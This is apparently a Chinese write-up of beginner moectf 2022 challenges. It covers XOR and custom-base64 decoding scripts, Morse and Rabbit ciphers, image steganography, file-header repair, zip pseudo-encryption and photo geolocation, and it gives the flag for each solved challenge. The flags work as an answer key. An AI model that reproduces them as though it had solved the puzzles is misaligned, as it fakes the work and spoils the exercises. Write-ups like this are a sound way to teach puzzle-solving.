s2 = [ 0x74, 0x76, 0x7C, 0x7A, 0x6D, 0x7F, 0x62, 0x41, 0x29, 0x6B, 
  0x46, 0x28, 0x6A, 0x46, 0x6A, 0x29, 0x46, 0x70, 0x77, 0x6D, 
  0x2A, 0x6B, 0x2A, 0x6A, 0x6D, 0x70, 0x77, 0x7E, 0x38, 0x38, 
  0x38, 0x38, 0x38, 0x64, 0x00]
flag = ''
for i in range(len(s2)):
    flag += chr(s2[i]^25)
print(flag)
```

moectf{X0r_1s_s0_int3r3sting!!!!!}

## Base

> 题目描述：base64可以将ascii表中无法显示的数转化为可以显示的数，进而方便在网络中进行传输qwq（建议百度查找一下原理）不过这个base有一点不一样哦

初步看描述猜到应该就是base64解码，只是码表需要换一下

![image-20220831122530437](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208311225360.png?x-oss-process=hzy)

密文1wX/yRrA4RfR2wj72Qv52x3L5qa=

码表是abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ

网上找个脚本，跑一下就出了

```
# coding:utf-8
 
#s = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
#s = "vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/"
s = "abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
def My_base64_encode(inputs):
	# 将字符串转化为2进制
	bin_str = []
	for i in inputs:
		x = str(bin(ord(i))).replace('0b', '')
		bin_str.append('{:0>8}'.format(x))
	#print(bin_str)
	# 输出的字符串
	outputs = ""
	# 不够三倍数，需补齐的次数
	nums = 0
	while bin_str:
		#每次取三个字符的二进制
		temp_list = bin_str[:3]
		if(len(temp_list) != 3):
			nums = 3 - len(temp_list)
			while len(temp_list) < 3:
				temp_list += ['0' * 8]
		temp_str = "".join(temp_list)
		#print(temp_str)
		# 将三个8字节的二进制转换为4个十进制
		temp_str_list = []
		for i in range(0,4):
			temp_str_list.append(int(temp_str[i*6:(i+1)*6],2))
		#print(temp_str_list)
		if nums:
			temp_str_list = temp_str_list[0:4 - nums]
			
		for i in temp_str_list:
			outputs += s[i]
		bin_str = bin_str[3:]
	outputs += nums * '='
	print("Encrypted String:\n%s "%outputs)
	
def My_base64_decode(inputs):
	# 将字符串转化为2进制
	bin_str = []
	for i in inputs:
		if i != '=':
			x = str(bin(s.index(i))).replace('0b', '')
			bin_str.append('{:0>6}'.format(x))
	#print(bin_str)
	# 输出的字符串
	outputs = ""
	nums = inputs.count('=')
	while bin_str:
		temp_list = bin_str[:4]
		temp_str = "".join(temp_list)
		#print(temp_str)
		# 补足8位字节
		if(len(temp_str) % 8 != 0):
			temp_str = temp_str[0:-1 * nums * 2]
		# 将四个6字节的二进制转换为三个字符
		for i in range(0,int(len(temp_str) / 8)):
			outputs += chr(int(temp_str[i*8:(i+1)*8],2))
		bin_str = bin_str[4:]	
	print("Decrypted String:\n%s "%outputs)
	
print()
print("     *************************************")
print("     *    (1)encode         (2)decode    *")	
print("     *************************************")
print()
 
 
num = input("Please select the operation you want to perform:\n")
if(num == "1"):
	input_str = input("Please enter a string that needs to be encrypted: \n")
	My_base64_encode(input_str)
else:
	input_str = input("Please enter a string that needs to be decrypted: \n")
	My_base64_decode(input_str)
```

moectf{qwqbase_qwq}

# 隐写等杂项

## Hide-and-seek

> 题目描述：诶？是谁捉迷藏还把脚露出来啦。

![image-20220826220115924](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262201044.png?x-oss-process=hzy)

直接复制

moectf{Hey_U_ve_f0und_m3!}

## Misc杂项之入门指北

![image-20220826220215458](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262202504.png?x-oss-process=hzy)

```
.-- . .-.. ..--- --- -- . ..--.- ....- --- ..--.- -- .. ...-- -.-. ..--.- .---- ..- -.-. -.- -.-- -.-.--
```

摩斯解密

![image-20220826220259993](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262203062.png?x-oss-process=hzy)

moectf{WEL2OME_4O_MI3C_1UCKY!}

## Rabbit

![image-20220826220456846](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262204893.png?x-oss-process=hzy)

base64解密,好吧翻车了，不是base64解密

![image-20220826220732161](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262207232.png?x-oss-process=hzy)

rabbit解密

moectf{We1c0m3_t0_moectf_an7_3n7oy_y0urse1f}

## 小纸条

> 题目描述：由于疫情无法回家的小明，正瘫坐在椅子，给你扔来了一张纸条，然后忧愁地望向窗外...  他怎么想什么呢？
> 提示：
>      <0> 全部大写，无分隔

## 寻找黑客的家

> 题目描述：大黑客Mikato期末结束就迫不及待的回了家，并在朋友圈发出了“这次我最早”的感叹。那么你能从这条朋友圈找到他的位置吗？

![附件1](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272035947.png?x-oss-process=hzy)

![附件2](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272036838.jpeg?x-oss-process=hzy)

题目就是给这俩图，找地方

> 大黑阔Mikato期末结束就迫不及待的回了家，并在朋友圈发出了“这次我最早”的感叹。那么你能从这条朋友圈找到他的位置吗？
>
> moectf{照片拍摄地市名区名路名} (字母均小写)
> 例如：西安市长安区西沣路：moectf{xian_changan_xifeng}

找找找，找呀找，然后是广东省深圳市龙华区清泉路

moectf{shenzhen_longhua_qingquan}

## Nyanyanya!

> 题目描述：图片隐写先看看哪里呢？

LSB解密

![image-20220826221543179](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262215229.png?x-oss-process=hzy)

moectf{A_go0d_way_t0_h14e_in50rmation_in_ima9e3}

## What do you recognize me by?

> 题目描述：你还认识我是谁吗？

![image-20220826221851979](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262218050.png?x-oss-process=hzy)

文件头修复一下，png文件头

![image-20220826221912209](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262219255.png?x-oss-process=hzy)

![image-20220826222032907](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208262220964.png?x-oss-process=hzy)

moectf{You_r4c0gnize_%e!}

## 想听点啥？

> 题目描述：听见啥了？还是看见啥了？

## Locked bass

> 题目描述：你想玩贝斯？这锁虚挂着的，能踹

附件是个压缩包，需要输密码，但是第一直觉告诉我是伪加密，但是尝试了winrar自带的修复工具没成功，后来尝试用ZipCenOp，修复成功，工具地址：https://didctf.lanzouw.com/ijVki09eh7sb

![image-20220827143457991](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271434068.png?x-oss-process=hzy)

![image-20220827143513975](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208271435041.png?x-oss-process=hzy)

moectf{N0w_th1s_i4_a_b@ss_U_can_u3e_to_pla9}

## A band

> 题目描述：我只知道机器只能听懂这种乐队演奏，一层一层还原，或许有你想要的

首先附件全是二进制

![image-20220827212142439](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272121537.png?x-oss-process=hzy)

先转str

[2进制到ASCII字符串在线转换工具 - Coding.Tools](https://coding.tools/cn/binary-to-text)

再转str

![image-20220827212228348](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272122419.png?x-oss-process=hzy)

再AAEncode解密

[AAEncode加密/解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)](http://www.atoolbox.net/Tool.php?Id=703)

![image-20220827212253786](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272122869.png?x-oss-process=hzy)

```
This_is_a_small_bass_KRUGS427MJQXG427ONSWK3LTL52G6X3CMVPWI2LGMZSXEZLOORPWM4TPNVPXI2DFL5YHEZLWNFXXK427N5XGKXZXGI3EEND2GRKHQRSBMJSHI5SWIF2WM2LQMJWVCS2FMVCUIYLHOB4WOQ3YNVYE2RLDME4EMWBRNY3VIMTSKBBG2TBZOVLEE6DTJJJVOQTVGZBHEYTEKY4EQWLPIJDVQY3PGJUFKQSMKBGUKZDWPJJTSYLXK43EOWLBKA2XANDDLA3FEMSXKA4GWYY=;
```

然后就是base套娃，三次不同的base得到flag

![image-20220827212330450](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208272123510.png?x-oss-process=hzy)

moectf{Why_s0_many_1nstruments?}
